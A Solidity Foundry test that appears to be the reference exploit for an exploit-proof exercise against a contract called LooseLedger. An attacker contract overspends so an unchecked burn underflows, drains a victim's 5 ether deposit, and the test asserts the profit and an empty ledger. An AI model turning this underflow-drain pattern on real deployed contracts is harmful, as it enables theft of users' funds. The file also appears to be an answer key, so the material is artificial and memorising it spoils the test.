// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for LooseLedger. Overspend so the unchecked burn underflows; the contract
// pays out its whole balance anyway.
// Run by hand:  forge test --root proofground --match-contract ProveLooseLedger -vvv

import {ExploitProof} from "@proof/ExploitProof.sol";
import {LooseLedger} from "@contracts/LooseLedger.sol";

contract Skimmer {
    LooseLedger ledger;

    constructor(LooseLedger _ledger) payable {
        ledger = _ledger;
    }

    function go() external {
        ledger.topUp{value: 1 ether}();
        ledger.spend(6 ether); // more than the 1 point we hold — underflows
    }

    receive() external payable {}
}

contract ProveLooseLedger is ExploitProof {
    function test_exploit() external {
        LooseLedger ledger = new LooseLedger();

        address alice = makeAddr("alice");
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        ledger.topUp{value: 5 ether}();

        Skimmer skimmer = new Skimmer{value: 1 ether}(ledger);
        noteAttackerStart(address(skimmer));

        skimmer.go();

        profit = address(skimmer).balance - 1 ether; // ~5 ether, net of the top-up
        assertExploitLanded(4 ether);
        assertEq(address(ledger).balance, 0, "ledger not drained");
    }
}
